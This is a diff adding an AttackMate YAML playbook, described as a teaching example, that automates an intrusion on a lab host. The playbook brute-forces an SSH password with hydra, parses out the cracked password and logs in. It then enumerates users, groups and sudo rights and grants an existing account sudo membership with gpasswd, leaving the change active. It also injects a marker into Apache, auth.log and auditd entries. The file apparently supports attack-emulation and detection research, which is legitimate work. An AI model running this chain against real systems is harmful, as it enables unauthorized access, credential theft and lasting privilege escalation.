@@ -1,0 +1,211 @@
+#
+# Author: AttackMate Persistence experiment (MIRANDA teaching example)
+# Description:
+#     Persistence by ACCOUNT MANIPULATION. hydra brute-forces vagrant's SSH password; we
+#     log in and run the standard enumeration (id, uname, /etc/group, sudo -l), then add
+#     an existing low-priv account (boba_fett) to the sudo group with gpasswd -a,
+#     granting it admin rights it never had. Left active (no reversal); vagrant's
+#     NOPASSWD sudo runs the change inline.
+#
+#     Tactic flow: Credential Access -> Initial Access -> Discovery -> Persistence
+#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
+#
+# AUTHORIZED USE ONLY:
+#     Run this only against systems you own or have explicit written permission to test.
+#
+vars:
+  TARGET: 172.28.128.3
+  BRUTE_USER: vagrant
+  PASSWDLIST: ~/tmp/passwd          # pre-existing wordlist on the op host (must contain 'vagrant')
+  VICTIM: boba_fett                 # existing account elevated to sudo (account manipulation)
+  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that contains
+  # a space, which would break the marker join across the access.log / auth.log / auditd layers.
+  INJECTION: "this_is_the_injection"
+
+commands:
+
+  # ===================== Phase A: operator-side prep =====================
+  - type: shell
+    cmd: "mkdir -p /tmp/persist_acctman"
+    metadata:
+      description: "Stage a local directory on the operator host to collect proof/output"
+
+  # ===================== Phase 0: pre-exploit log poisoning =====================
+  - type: http-client
+    cmd: GET
+    url: http://$TARGET/?probe=1
+    useragent: "$INJECTION"
+    exit_on_error: False
+    metadata:
+      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
+      techniques: "T1562.006"
+      tactics: "Defense Evasion"
+
+  - type: sleep
+    seconds: 4
+    min_sec: 1
+    random: True
+    metadata:
+      description: "Human-paced jitter between the two probes"
+
+  - type: ssh
+    cmd: id
+    username: "$INJECTION"
+    password: "x"
+    hostname: $TARGET
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
+      techniques: "T1110.001,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ===================== Phase 1: Credential Access (SSH brute force) =====================
+  - type: shell
+    cmd: hydra -l $BRUTE_USER -P $PASSWDLIST ssh://$TARGET
+    metadata:
+      description: "Brute-force the SSH password with hydra"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  - type: setvar
+    variable: CRACKED
+    cmd: "PARSE_FAILED"
+    metadata:
+      description: "Pre-seed the cracked-password variable so a parse failure is detectable"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  - type: regex
+    input: RESULT_STDOUT
+    cmd: "login:\\s+$BRUTE_USER\\s+password:\\s+(\\S+)"
+    mode: findall
+    output:
+      CRACKED: "$MATCH_0"
+    metadata:
+      description: "Parse the cracked SSH password from the hydra output"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  - type: debug
+    cmd: "Cracked SSH password for $BRUTE_USER: $CRACKED"
+    metadata:
+      description: "Print the cracked credential (PARSE_FAILED means hydra did not crack it)"
+
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\""
+    username: $BRUTE_USER
+    password: "$CRACKED"
+    hostname: $TARGET
+    interactive: False
+    creates_session: "foothold"
+    metadata:
+      description: "Log in over SSH using the brute-forced password; execve poisoned with the marker"
+      techniques: "T1078,T1021.004,T1033,T1562.006"
+      tactics: "Initial Access,Lateral Movement,Discovery,Defense Evasion"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before enumeration (human pacing)"
+
+  # ===================== Phase 2: Discovery / enumeration =====================
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/persist_acctman/disc_01_id.txt
+    metadata:
+      description: "Current identity (expect vagrant); execve poisoned with the marker"
+      techniques: "T1033,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'uname -a' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/persist_acctman/disc_02_uname.txt
+    metadata:
+      description: "Kernel name/version/arch; execve poisoned with the marker"
+      techniques: "T1082,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'cat /etc/group' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/persist_acctman/disc_03_group.txt
+    metadata:
+      description: "Local groups and members (sudo/docker rosters); execve poisoned with the marker"
+      techniques: "T1069.001,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'sudo -n -l 2>/dev/null' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/persist_acctman/disc_04_sudo.txt
+    metadata:
+      description: "List sudo privileges without a password (expect NOPASSWD ALL); execve poisoned with the marker"
+      techniques: "T1069.001,T1033,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[account_manipulation] sudo -l (expect vagrant NOPASSWD: ALL) -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface the sudo rules inline (the root path for the persistence step)"
+      techniques: "T1069.001"
+      tactics: "Discovery"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before planting persistence (human pacing)"
+
+  # ===================== Persistence: Account Manipulation (T1098), LEFT ACTIVE =====================
+  - type: ssh
+    cmd: "bash -c 'id $VICTIM' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/persist_acctman/persist_before.txt
+    metadata:
+      description: "Baseline the victim account before manipulation; execve poisoned with the marker"
+      techniques: "T1087.001,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'sudo -n gpasswd -a $VICTIM sudo' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Add the existing account to the sudo group (account manipulation)"
+      techniques: "T1098,T1562.006"
+      tactics: "Persistence,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'getent group sudo' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/persist_acctman/persist_proof.txt
+    metadata:
+      description: "Show the victim now in the sudo group (artefact); execve poisoned with the marker"
+      techniques: "T1098,T1562.006"
+      tactics: "Persistence,Defense Evasion"
+
+  - type: debug
+    cmd: "[account_manipulation] complete -> LEFT ACTIVE: $VICTIM added to sudo group -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface the group-membership change inline (no reversal - left active)"
+      techniques: "T1098"
+      tactics: "Persistence"
